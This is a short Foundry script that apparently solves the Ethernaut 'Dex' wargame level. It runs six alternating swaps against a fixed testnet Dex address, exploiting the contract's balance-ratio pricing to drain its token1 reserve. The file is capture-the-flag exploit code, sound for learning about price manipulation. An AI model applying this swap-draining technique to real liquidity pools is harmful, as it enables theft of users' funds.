// SPDX-License-Identifier: MIT
// forge script ./script/HackDex.s.sol --private-key $ETHERNAUGHT_PRIVATE_KEY --broadcast --rpc-url $GORELI_OPTIMISIM_RPC -vvvv
pragma solidity 0.8.17;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract HackDex is Script {

    Dex dex = Dex(0x75B4Be5e1A3453274F3FB01388d7f4D8C441F530);
    function run() external{
        vm.startBroadcast();

        dex.approve(address(dex), 200);
        address token1 = dex.token1();
        address token2 = dex.token2();

        dex.swap(token1, token2, 10);
        dex.swap(token2, token1, 20);
        dex.swap(token1, token2, 24);
        dex.swap(token2, token1, 30);
        dex.swap(token1, token2, 41);
        dex.swap(token2, token1, 45);

        console.log("Final token1 balance of Dex is : ", dex.balanceOf(token1, address(dex)));
        vm.stopBroadcast();
    }
}
